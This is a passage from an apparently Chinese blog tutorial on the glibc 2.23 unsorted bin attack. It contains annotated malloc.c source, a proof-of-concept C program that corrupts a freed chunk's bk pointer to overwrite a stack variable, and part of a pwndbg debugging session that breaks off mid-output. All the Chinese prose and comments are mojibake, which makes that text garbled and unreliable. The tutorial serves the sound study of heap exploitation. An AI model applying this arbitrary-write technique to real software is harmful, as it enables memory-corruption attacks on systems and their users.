attackä½¿ç”¨ï¼Œè¾¾åˆ°ä»»æ„åœ°å€å†™çš„æ•ˆæœã€‚</strong></p><h2 id="unsortedbin-æºç åˆ†æ"><a href="#unsortedbin-æºç åˆ†æ" class="headerlink" title="unsortedbin æºç åˆ†æ"></a>unsortedbin æºç åˆ†æ</h2><blockquote><p>è¿™é‡Œä½¿ç”¨libc-2.23ç‰ˆæœ¬çš„æºç <br>ä¸‹é¢çš„æºç ä¸ç†è§£ä¹Ÿæ²¡æœ‰å…³ç³»ï¼ˆçœ‹çœ‹å°±å¥½ï¼‰ï¼Œè¿™å¯¹åˆ©ç”¨unsortedbinè¿™ç§æ”»å‡»æ–¹å¼æ²¡æœ‰ä»»ä½•å½±å“ï¼ˆï¼‰ã€‚<br>æœ€é‡è¦çš„æ˜¯æœ€åçš„æ€»ç»“ï¼Œè®°ä½å°±è¡Œäº†ã€‚</p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><code class="hljs c">#æºç çš„ç¬¬<span class="hljs-number">3470</span>è¡Œ<span class="hljs-number">-3597</span>è¡Œ<br>         <span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<br>#å–é“¾è¡¨å°¾éƒ¨çš„chunkè®°ä½œvictim<br>        {<br>          bck = victim-&gt;bk;<br>          #å€’æ•°ç¬¬äºŒä¸ªchunkè®°ä½œbck<br>          #æ¥ä¸‹æ¥å¯¹victimçš„sizeä½è¿›è¡Œæ£€æŸ¥<br>          <span class="hljs-keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>            malloc_printerr (check_action, <span class="hljs-string">"malloc(): memory corruption"</span>,<br>                             chunk2mem (victim), av);<br>          size = chunksize (victim);<br>  #æ£€æŸ¥é€šè¿‡ï¼Œè®¡ç®—victimå¾—åˆ°å®é™…chunkçš„å¤§å°<br>          <span class="hljs-comment">/*</span><br><span class="hljs-comment">             If a small request, try to use last remainder if it is the</span><br><span class="hljs-comment">             only chunk in unsorted bin.  This helps promote locality for</span><br><span class="hljs-comment">             runs of consecutive small requests. This is the only</span><br><span class="hljs-comment">             exception to best-fit, and applies only when there is</span><br><span class="hljs-comment">             no exact fit for a small chunk.</span><br><span class="hljs-comment">           */</span><br><br>          <span class="hljs-keyword">if</span> (in_smallbin_range (nb) &amp;&amp;<br>              bck == unsorted_chunks (av) &amp;&amp;<br>              victim == av-&gt;last_remainder &amp;&amp;<br>              (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>              #å‡å¦‚è¯´æˆ‘ä»¬ç”³è¯·çš„<span class="hljs-built_in">malloc</span>å¤§å°å±äºsmallbinçš„èŒƒå›´ï¼Œå¹¶ä¸”last_remainderæ˜¯<br>              <span class="hljs-meta">#unsortedbinçš„å”¯ä¸€ä¸€ä¸ªchunkæ—¶ï¼Œä¼˜å…ˆä½¿ç”¨è¿™ä¸ªchunkã€‚</span><br>              <br>            {<br>              #å‡è‹¥æ»¡è¶³æ¡ä»¶åˆ™å¯¹å…¶è¿›è¡Œåˆ‡å‰²å’Œè§£é“¾æ“ä½œ<br>              <br>              <span class="hljs-comment">/* split and reattach remainder */</span><br>              remainder_size = size - nb;<br>              remainder = chunk_at_offset (victim, nb);<br>              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;<br>              av-&gt;last_remainder = remainder;<br>              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);<br>              <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>                {<br>                  remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                  remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                }<br><br>              set_head (victim, nb | PREV_INUSE |<br>                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>              set_head (remainder, remainder_size | PREV_INUSE);<br>              set_foot (remainder, remainder_size);<br><br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            }<br>  #å¦‚æœä¸Šè¿°æ¡ä»¶ä¸æ»¡è¶³ï¼Œåˆ™å°†victimä»é“¾ä¸­å–å‡ºä¹‹åæ”¾åˆ°åˆé€‚çš„é“¾ä¸­æˆ–è¿”å›ç»™ç”¨æˆ·ã€‚<br>          #å…¶ä¸­unsorted_chunks (av)-&gt;bk = bck;<br>          <span class="hljs-meta">#bck-&gt;fd = unsorted_chunks (av);</span><br>          #æ˜¯unsorted bin attackäº§ç”Ÿçš„åŸå› ï¼Œ<br>          #ä¸€æ—¦æˆ‘ä»¬ç»•è¿‡ä¹‹å‰çš„æ£€æŸ¥åˆ°è¾¾è¿™é‡Œï¼Œ<br>          #åœ¨å¯ä»¥æ§åˆ¶victim-&gt;bkå³bckçš„æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥å¾€bck-&gt;fdå†™å…¥unsorted_chunks(av)<br>          #å³*(bck+<span class="hljs-number">0x10</span>)=unsorted(av)ã€‚<br>          <span class="hljs-comment">/* remove from unsorted list */</span><br>          <span class="hljs-meta">#unsortedbinäº§ç”Ÿçš„åŸå› ï¼š</span><br>          unsorted_chunks (av)-&gt;bk = bck;<br>          bck-&gt;fd = unsorted_chunks (av);<br>  #<br>          <span class="hljs-comment">/* Take now instead of binning if exact fit */</span><br>      #å¦‚æœæˆ‘ä»¬è¯·æ±‚çš„nbåŒvictimçš„å¤§å°æ°å¥½å»åˆï¼Œå°±ç›´æ¥è¿”å›è¿™ä¸ªå—ç»™ç”¨æˆ·ã€‚<br>          <span class="hljs-keyword">if</span> (size == nb)<br>            {<br>              set_inuse_bit_at_offset (victim, size);<br>              <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                victim-&gt;size |= NON_MAIN_ARENA;<br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            }<br>                  <br>          <span class="hljs-comment">/* place chunk in bin */</span><br>  #å¦‚æœä¹‹å‰çš„æ¡ä»¶éƒ½ä¸æ»¡è¶³ï¼Œæ„å‘³ç€ç›®å‰çš„victimä¸èƒ½æ»¡è¶³ç”¨æˆ·çš„éœ€æ±‚ï¼Œ<br>          #éœ€è¦æ ¹æ®å…¶sizeæ”¾å…¥small binæˆ–large binçš„é“¾ï¼Œ<br>          #å…¶ä¸­åœ¨åè€…å®ç°ä¸­å­˜åœ¨large bin attackï¼Œ<br>          #ç”±äºåŒæœ¬æ–‡æ— å…³å°±ä¸å†è¿›ä¸€æ­¥å±•å¼€ï¼Œæœ€åæ˜¯unlinkå°†victimå½»åº•è§£é“¾ã€‚<br>          <span class="hljs-keyword">if</span> (in_smallbin_range (size))<br>            {<br>              victim_index = smallbin_index (size);<br>              bck = bin_at (av, victim_index);<br>              fwd = bck-&gt;fd;<br>            }<br>          <span class="hljs-keyword">else</span><br>            {<br>              victim_index = largebin_index (size);<br>              bck = bin_at (av, victim_index);<br>              fwd = bck-&gt;fd;<br><br>              <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>              <span class="hljs-keyword">if</span> (fwd != bck)<br>                {<br>                  <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>                  size |= PREV_INUSE;<br>                  <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (bck-&gt;bk-&gt;size))<br>                    {<br>                      fwd = bck;<br>                      bck = bck-&gt;bk;<br><br>                      victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                    }<br>                  <span class="hljs-keyword">else</span><br>                    {<br>                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                      <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; fwd-&gt;size)<br>                        {<br>                          fwd = fwd-&gt;fd_nextsize;<br>                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                        }<br><br>                      <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) fwd-&gt;size)<br>                        <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                        fwd = fwd-&gt;fd;<br>                      <span class="hljs-keyword">else</span><br>                        {<br>                          victim-&gt;fd_nextsize = fwd;<br>                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                          fwd-&gt;bk_nextsize = victim;<br>                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                        }<br>                      bck = fwd-&gt;bk;<br>                    }<br>                }<br>              <span class="hljs-keyword">else</span><br>                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>            }<br><br>          mark_bin (av, victim_index);<br>          victim-&gt;bk = bck;<br>          victim-&gt;fd = fwd;<br>          fwd-&gt;bk = victim;<br>          bck-&gt;fd = victim;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_ITERS       10000</span><br>          <span class="hljs-keyword">if</span> (++iters &gt;= MAX_ITERS)<br>            <span class="hljs-keyword">break</span>;<br>        }<br></code></pre></td></tr></tbody></table></figure><h2 id="unsortedbin-attack-åŸç†"><a href="#unsortedbin-attack-åŸç†" class="headerlink" title="unsortedbin_attack åŸç†"></a>unsortedbin_attack åŸç†</h2><p>ä»ä¸‹é¢çš„æºç ä¸­å¯ä»¥çœ‹åˆ°ï¼Œå½“å°†ä¸€ä¸ªunsortedbinå–å‡ºæ—¶ï¼Œä¼šå°†bck-&gt;fdçš„ä½ç½®å†™å…¥æœ¬unsortedbinçš„ä½ç½®</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#glibc-2.23/malloc/malloc.c</span><br><span class="hljs-comment">#æºç ç¬¬3515-3517è¡Œ</span><br>  /* remove <span class="hljs-keyword">from</span> unsorted <span class="hljs-built_in">list</span> */<br>          unsorted_chunks (av)-&gt;bk = bck;<br>          bck-&gt;fd = unsorted_chunks (av);<br>//unsorted_chunks(av)å…¶å®æ˜¯&amp;main_arena.top<br></code></pre></td></tr></tbody></table></figure><p>æ¢è€Œè¨€ä¹‹ï¼Œå¦‚æœæˆ‘ä»¬æ§åˆ¶äº†bkçš„å€¼ï¼Œæˆ‘ä»¬å°±èƒ½å°†unsorted_chunk(av)å†™åˆ°ä»»æ„åœ°å€ã€‚</p><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>æ¥ä¸‹æ¥æˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªdemoæ¥æ¼”ç¤ºunsortedbin_attackçš„åŸç†ï¼š</p><blockquote><p>æ¥æºï¼š<a href="https://www.yuque.com/hxfqg9/bin/tubv6q">https://www.yuque.com/hxfqg9/bin/tubv6q</a><br>æ„Ÿè°¢@yichenå¸ˆå‚…çš„æ±‰åŒ–<br>è¿™ä¸ªç¨‹åºçš„ç›®æ ‡æ˜¯é€šè¿‡unsortedbin_attackå°†stack_varæ”¹æˆä¸€ä¸ªå¾ˆå¤§çš„å€¼ã€‚</p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>{<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"unsorted bin attack å®ç°äº†æŠŠä¸€ä¸ªè¶…çº§å¤§çš„æ•°ï¼ˆunsorted bin çš„åœ°å€ï¼‰å†™åˆ°ä¸€ä¸ªåœ°æ–¹\n"</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"å®é™…ä¸Šè¿™ç§æ”»å‡»æ–¹æ³•å¸¸å¸¸ç”¨æ¥ä¿®æ”¹ global_max_fast æ¥ä¸ºè¿›ä¸€æ­¥çš„ fastbin attack åšå‡†å¤‡\n\n"</span>);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var=<span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"æˆ‘ä»¬å‡†å¤‡æŠŠè¿™ä¸ªåœ°æ–¹ %p çš„å€¼ %ld æ›´æ”¹ä¸ºä¸€ä¸ªå¾ˆå¤§çš„æ•°\n\n"</span>, &amp;stack_var, stack_var);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"ä¸€å¼€å§‹å…ˆç”³è¯·ä¸€ä¸ªæ¯”è¾ƒæ­£å¸¸çš„ chunk: %p\n"</span>,p);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"å†åˆ†é…ä¸€ä¸ªé¿å…ä¸ top chunk åˆå¹¶\n\n"</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">500</span>);<br><br>    <span class="hljs-built_in">free</span>(p);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"å½“æˆ‘ä»¬é‡Šæ”¾æ‰ç¬¬ä¸€ä¸ª chunk ä¹‹åä»–ä¼šè¢«æ”¾åˆ° unsorted bin ä¸­ï¼ŒåŒæ—¶å®ƒçš„ bk æŒ‡é’ˆä¸º %p\n"</span>,(<span class="hljs-type">void</span>*)p[<span class="hljs-number">1</span>]);<br><br>    p[<span class="hljs-number">1</span>]=(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var<span class="hljs-number">-2</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"ç°åœ¨å‡è®¾æœ‰ä¸ªæ¼æ´ï¼Œå¯ä»¥è®©æˆ‘ä»¬ä¿®æ”¹ free äº†çš„ chunk çš„ bk æŒ‡é’ˆ\n"</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"æˆ‘ä»¬æŠŠç›®æ ‡åœ°å€ï¼ˆæƒ³è¦æ”¹ä¸ºè¶…å¤§å€¼çš„é‚£ä¸ªåœ°æ–¹ï¼‰å‡å» 0x10 å†™åˆ° bk æŒ‡é’ˆ:%p\n\n"</span>,(<span class="hljs-type">void</span>*)p[<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"å†å» malloc çš„æ—¶å€™å¯ä»¥å‘ç°é‚£é‡Œçš„å€¼å·²ç»æ”¹å˜ä¸º unsorted bin çš„åœ°å€\n"</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"%p: %p\n"</span>, &amp;stack_var, (<span class="hljs-type">void</span>*)stack_var);<br>}<br></code></pre></td></tr></tbody></table></figure><p>å¤§è‡´çœ‹ä¸€ä¸‹æµç¨‹ï¼Œç„¶åå¼€å§‹è¿›è¡Œè°ƒè¯•ã€‚</p><blockquote><p>ç¼–è¯‘å‘½ä»¤ï¼šgcc -g demo.c -o demo</p></blockquote><h3 id="å¼€å§‹è°ƒè¯•"><a href="#å¼€å§‹è°ƒè¯•" class="headerlink" title="å¼€å§‹è°ƒè¯•"></a>å¼€å§‹è°ƒè¯•</h3><p>é¦–å…ˆå¯¹ä»£ç çš„ç¬¬12è¡Œä¸‹æ–­ç‚¹ï¼Œå¼€å§‹è°ƒè¯•ç¨‹åºï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs c">ubuntu@ubuntu:~/Desktop/unsortedbin_demo$ gdb demo<br>GNU <span class="hljs-title function_">gdb</span> <span class="hljs-params">(Ubuntu <span class="hljs-number">7.11</span><span class="hljs-number">.1</span><span class="hljs-number">-0u</span>buntu1~<span class="hljs-number">16.5</span>)</span> 7.11.1<br><span class="hljs-title function_">Copyright</span> <span class="hljs-params">(C)</span> 2016 Free Software Foundation, Inc.<br>License GPLv3+: GNU GPL version 3 or later &lt;http:<span class="hljs-comment">//gnu.org/licenses/gpl.html&gt;</span><br>This is <span class="hljs-built_in">free</span> software: you are <span class="hljs-built_in">free</span> to change and redistribute it.<br>There is NO WARRANTY, to the extent permitted by law.  Type "show copying"<br>and "show warranty" <span class="hljs-keyword">for</span> details.<br>This GDB was configured as "x86_64-linux-gnu".<br>Type "show configuration" <span class="hljs-keyword">for</span> configuration details.<br>For bug reporting instructions, please see:<br>&lt;http:<span class="hljs-comment">//www.gnu.org/software/gdb/bugs/&gt;.</span><br>Find the GDB manual and other documentation resources online at:<br>&lt;http:<span class="hljs-comment">//www.gnu.org/software/gdb/documentation/&gt;.</span><br>For help, type "help".<br>Type "apropos word" to search <span class="hljs-keyword">for</span> commands related to "word"...<br>pwndbg: loaded 192 commands. Type pwndbg [filter] <span class="hljs-keyword">for</span> a <span class="hljs-built_in">list</span>.<br>pwndbg: created $rebase, $ida gdb <span class="hljs-title function_">functions</span> <span class="hljs-params">(can be used with print/<span class="hljs-keyword">break</span>)</span><br>Reading symbols from demo...done.<br>pwndbg&gt; b 12<br>Breakpoint 1 at 0x400722: file demo.c, line 12.<br>pwndbg&gt; r<br>Starting program: /home/ubuntu/Desktop/unsortedbin_demo/demo <br>unsorted bin attack å®ç°äº†æŠŠä¸€ä¸ªè¶…çº§å¤§çš„æ•°ï¼ˆunsorted bin çš„åœ°å€ï¼‰å†™åˆ°ä¸€ä¸ªåœ°æ–¹<br>å®é™…ä¸Šè¿™ç§æ”»å‡»æ–¹æ³•å¸¸å¸¸ç”¨æ¥ä¿®æ”¹ global_max_fast æ¥ä¸ºè¿›ä¸€æ­¥çš„ fastbin attack åšå‡†å¤‡<br><br>æˆ‘ä»¬å‡†å¤‡æŠŠè¿™ä¸ªåœ°æ–¹ 0x7fffffffdd78 çš„å€¼ 0 æ›´æ”¹ä¸ºä¸€ä¸ªå¾ˆå¤§çš„æ•°<br><br><br>Breakpoint 1, <span class="hljs-title function_">main</span> <span class="hljs-params">()</span> at demo.c:12<br>12    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>);<br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ REGISTERS ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br> RAX  <span class="hljs-number">0x51</span><br> RBX  <span class="hljs-number">0x0</span><br> RCX  <span class="hljs-number">0x7ffff7b04380</span> (__write_nocancel+<span class="hljs-number">7</span>) â—‚â€” cmp    rax, <span class="hljs-number">-0xfff</span><br> RDX  <span class="hljs-number">0x7ffff7dd3770</span> (_IO_stdfile_2_lock) â—‚â€” <span class="hljs-number">0x0</span><br> RDI  <span class="hljs-number">0x2</span><br> RSI  <span class="hljs-number">0x7fffffffb6e0</span> â—‚â€” <span class="hljs-number">0x87e5acbbe49188e6</span><br> R8   <span class="hljs-number">0x7ffff7fda700</span> â—‚â€” <span class="hljs-number">0x7ffff7fda700</span><br> R9   <span class="hljs-number">0x51</span><br> R10  <span class="hljs-number">0x0</span><br> R11  <span class="hljs-number">0x246</span><br> R12  <span class="hljs-number">0x4005b0</span> (_start) â—‚â€” xor    ebp, ebp<br> R13  <span class="hljs-number">0x7fffffffde70</span> â—‚â€” <span class="hljs-number">0x1</span><br> R14  <span class="hljs-number">0x0</span><br> R15  <span class="hljs-number">0x0</span><br> RBP  <span class="hljs-number">0x7fffffffdd90</span> â€”â–¸ <span class="hljs-number">0x400870</span> (__libc_csu_init) â—‚â€” push   r15<br> RSP  <span class="hljs-number">0x7fffffffdd70</span> â€”â–¸ <span class="hljs-number">0x400870</span> (__libc_csu_init) â—‚â€” push   r15<br> RIP  <span class="hljs-number">0x400722</span> (main+<span class="hljs-number">124</span>) â—‚â€” mov    edi, <span class="hljs-number">0x410</span><br>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€<br> â–º <span class="hljs-number">0x400722</span> &lt;main+<span class="hljs-number">124</span>&gt;    mov    edi, <span class="hljs-number">0x410</span><br>   <span class="hljs-number">0x400727</span> &lt;main+<span class="hljs-number">129</span>&gt;    call   <span class="hljs-built_in">malloc</span>@plt &lt;<span class="hljs-built_in">malloc</span>@plt&gt;<br> <br>   <span class="hljs-number">0x40072c</span> &lt;main+<span class="hljs-number">134</span>&gt;    mov    qword ptr [rbp - <span class="hljs-number">0x10</span>], rax<br>   <span class="hljs-number">0x400730</span> &lt;main+<span class="hljs-number">138</span>&gt;    mov    rax, qword ptr [rip + <span class="hljs-number">0x200929</span>] &lt;<span class="hljs-number">0x601060</span>&gt;<br>   <span class="hljs-number">0x400737</span> &lt;main+<span class="hljs-number">145</span>&gt;    mov    rdx, qword ptr [rbp - <span class="hljs-number">0x10</span>]<br>   <span class="hljs-number">0x40073b</span> &lt;main+<span class="hljs-number">149</span>&gt;    mov    esi, <span 